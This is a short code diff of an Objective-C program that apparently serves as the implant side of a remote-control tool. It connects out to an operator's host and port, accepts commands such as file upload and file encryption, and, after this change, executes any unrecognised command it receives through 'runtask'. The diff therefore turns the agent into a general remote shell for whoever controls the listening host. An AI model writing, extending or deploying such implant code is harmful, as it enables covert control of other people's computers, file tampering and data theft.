@@ -24,6 +24,7 @@ int main(int argc, const char * argv[]) {
     int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
     _espl.skey = args[2];
     _espl.terminator = [args[3] substringToIndex:16];
+    _espl.liveterminator = [args[4] substringToIndex:16];
     if (success == -1) {
         NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
     }
@@ -95,9 +96,6 @@ int main(int argc, const char * argv[]) {
                 else if ([cmdarray[0] isEqualToString: @"upload"]) { //still need to do this
                     [_espl receiveFile:cmdarray[0]];
                 }
-                else if ([cmdarray[0] isEqualToString: @"exec"]) {
-                    [_espl executeCMD:cmdarray];
-                }
                 else if ([cmdarray[0] isEqualToString: @"encrypt"]) {
                     [_espl encryptFile:cmdarray];
                 }
@@ -105,14 +103,14 @@ int main(int argc, const char * argv[]) {
                     [_espl decryptFile:cmdarray];
                 }
                 else {
-                    [_espl sendString:@"-1"];
+                    [_espl runtask:command];
                 }
                 //clear the received data
                 memset(buffer,'\0',2048);
             }
         }
     }
-        
+    
     return 0;
 }
 
